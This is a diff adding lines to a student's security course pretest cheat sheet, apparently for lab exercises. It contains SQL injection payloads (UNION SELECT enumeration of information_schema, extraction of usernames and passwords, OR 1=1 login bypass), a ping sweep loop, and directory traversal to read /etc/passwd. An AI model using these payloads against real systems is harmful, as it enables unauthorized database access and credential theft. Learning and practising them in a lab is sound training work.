@@ -2,6 +2,7 @@ AT HOME -> USE MOBAXTERM!!!
 ------------------------------------------------------------------------------------------------------------------------
 COSC SECURITY PRETEST NOTES
 ----------
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution + clipboard /v:<IP>
 RECON
   PING SWEEP: 
     Linux: for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
@@ -17,12 +18,24 @@ RECON
 ----------
 WEB EXPLOITATION / SQL
   SQL EXAMPLE: select column, column, 8 (placeholder) FROM database.table
+  EXAMPLE: ?Selection=2%20UNION%20select%20studentID,%20username,%20passwd%20FROM%20session.userinfo
+  THE FOLLOWING MUST BE PUT INSIDE A VULNERABLE INPUT FIELD ON A WEBSITE AND NOT JUST IN THE URL:
+  Audi 'UNION SELECT 1,2,3,4,5'; , 
+  Audi 'UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns#
+  Audi 'UNION SELECT tireid, 2, name, size,cost from session.Tires#
+  
+  THE ABOVE THREE LINES DISPLAY PADDING, IF YOU SEE A VALUE FIELD NOT PRINTING, PAD IT WITH A VALUE SO THE PAGE CAN STILL RENDER! NUMBER OF PADDED VALUES REQURIED DETERMINED BY DATABASE NUMBER OF FIELDS!!!
   FUZZING:
     ?product=1 OR 1=1; ITERATE THROUGH AND ATTEMPT EVERYWHERE POSSIBLE UNTIL ABNORMAL RESULT DISCOVERED; MOVE FORWARD FROM HERE!!!
   ON VULNERABLE PAGE ATTEMPT:
     ?product=7 UNION select 1,3,2
     ?product=7 UNION select table_schema,column_name,table_name FROM information_schema.columns;
+      table_schema = DATABASE NAMES, table_name = TABLE NAMES, column_name = COLUMN NAMES 
     ?product=7 UNION select username, name, user_id FROM siteusers.users;
+    ?selection=2 or 1=1;
+    
+  UPON DISCOVERY OF CREDENTIALS ATTEMPT BASE64, HEX, ROT-13 CONVERSIONS VIA CYBERCHEF IF NEEDED!!!
+  
 ----------
 METHODOLOGY: 
 WHEN DISCOVER IP OF INTEREST:
@@ -32,7 +45,7 @@ WHEN DISCOVER INPUT FIELD ON WEBSITE:
   - ATTEMPT DIRECTORY TRAVERSAL ../../../../ , LOOK AT /etc/passwd FOR USERS WITH SHELLS OR PERMS, /etc/host FOR NEW IPS
   - TO DISPLAY WHAT WAS SENT IN INPUT FIELD AFTER SUBMISSION: F12 -> NEWTWORK, REQUEST, ENABLE RAW, AFTER THIS: ADD "?" TO URL AFTER .php, THEN PASTE FINDINGS FROM THE REQUEST
   - OR TRY IN URL: ?username=tom' OR 1='1 & passwd=tom' OR 1='1
-
+!!!ON WINDOWS INITIAL LOGIN, LOOK AT SERVICES, SCHEDULED TASKS, REGISTRY LOCATIONS RELEVANT TO PERSISTENCE!!!
 ------------------------------------------------------------------------------------------------------------------------
 SCRIPTS 
 mybuff.py
